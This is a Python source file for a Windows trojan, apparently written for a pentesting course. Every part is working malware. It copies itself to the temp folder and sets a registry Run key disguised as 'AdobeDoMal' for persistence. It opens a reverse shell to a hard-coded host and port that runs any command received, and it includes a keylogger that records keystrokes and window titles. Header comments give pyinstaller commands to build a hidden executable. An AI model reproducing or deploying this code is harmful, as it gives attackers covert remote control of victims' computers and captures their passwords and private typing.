# encoding: utf-8
# encoding: iso-8859-1
# encoding: win-1252

#######################################################################################
#                                                                                     #
#                        -----------------------------                                #
#                                  ANOTAÇÕES                                          #
#                        -----------------------------                                #
#                                                                                     #
#                                                                                     #
# Desenvolvedor: h1s0k4                                                               #
# E-mail: willian_brito00@hotmail.com                                                 #
#                                                                                     #
# Caminho Registro: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   #
#                                                                                     #
# (Executar na Pasta do Arquivo [ADM])                                                #
# COMANDO: pyinstaller -F -w --clean h1s0k4.py ou pyinstaller -w h1s0k4.py --onefile  #
#                                                                                     #
#                               #############################                         #
#                               # Python para Pentesters    #                         #
#                               # solyd.com.br/treinamentos #                         #
#                               #############################                         #
#                                                                                     #
#######################################################################################

import socket
import time
import subprocess
import tempfile
import os
import pyHook
import pythoncom

janela = None


IP = '192.168.0.107' # IP EXTERNO ou NO-IP
PORT = 666
FILENAME = 'h1s0k4.exe'
TEMPDIR = tempfile.gettempdir() #c:\users\willian\appdata\local\temp
DIRETORIO = os.path.dirname(os.path.abspath(__file__))


# FUNÇÃO: PERSISTENTE
def persis():
    try:
        subprocess.call('COPY ' + FILENAME + ' ' + TEMPDIR, shell=True)
    except:
        print 'Erro na copia do Trojan'
        pass

    try:
        subprocess.call('REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "AdobeDoMal" /t REG_SZ /F /D '  
        + TEMPDIR + "\\" + FILENAME, shell=True)
    except:
        print 'Erro na Cópia para o Registro'
        pass       


# FUNÇÃO: KEYLOGGER (CAPTURANDO TECLAS)
def tecla_pressionada(evento):
    arquivo = open('log.txt', 'a')
    global janela
    if evento.WindowName != janela:
        janela = evento.WindowName
        arquivo.write('\n' + janela + ' - ' + str(evento.Time) + '\n')
    arquivo.write(chr(evento.Ascii))
    arquivo.close()


# FUNÇÃO: EXECUTANDO KEYLOGGER
def exec_keylogger():
    hook = pyHook.HookManager()
    hook.KeyDown = tecla_pressionada
    hook.HookKeyboard()

    pythoncom.PumpMessages()


# FUNÇÃO: CONECTAR
def connect(IP, PORT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        
        s.send('''
        ██╗  ██╗ ██╗███████╗ ██████╗ ██╗  ██╗██╗  ██╗
        ██║  ██║███║██╔════╝██╔═████╗██║ ██╔╝██║  ██║
        ███████║╚██║███████╗██║██╔██║█████╔╝ ███████║
        ██╔══██║ ██║╚════██║████╔╝██║██╔═██╗ ╚════██║
        ██║  ██║ ██║███████║╚██████╔╝██║  ██╗     ██║
        ╚═╝  ╚═╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═╝ 

        [+] h1s0k4Sploit - PAYLOAD [+]
        By: h1s0k4
        ''');
    
        s.send('\n[!] Conexao Recebida\n\n')
        s.send(os.getcwd() + '\n[H1s0k4] -> ')
        return s
        
    except Exception as e:
        print "Erro de Conexão:", e
        return None


# FUNÇÃO: CONECTADO
def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if data[:-1] == '/exit':
                s.close()
                exit(0)

            elif data[:-1] == '/keylogger':
                exec_keylogger()

            else:
                cmd(s, data[:-1])
    except:
        print 'Erro no LISTEN'
        error(s)


# FUNÇÃO: EXECUTAR COMANDOS
def cmd(s, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        saida = proc.stdout.read() + proc.stderr.read()
        if "cd" in data:
            os.chdir(data[3:].replace('\n', ''))

            s.send(saida + '\n' + os.getcwd() + '\n[H1s0k4] -> ')

        else:
            s.send(saida + '\n' + os.getcwd() + '\n[H1s0k4] -> ')
    except:
        print 'Erro no CMD'
        error(s)


# FUNÇÃO: ERROR (Caso der um Erro Reconectar com LOOPING INFINITO)
def error(s):
    if s:
        s.close()
    main()


# FUNÇÃO: RECONECTAR (LOOPING INFINITO)
def main():

    while True:
        s_conectado = connect(IP, PORT)
        if s_conectado:
            listen(s_conectado)
        else:
            print 'Conexão deu Erro tentando Novamente'
            time.sleep(5)


if DIRETORIO.lower() != TEMPDIR.lower():
   persis()

main()
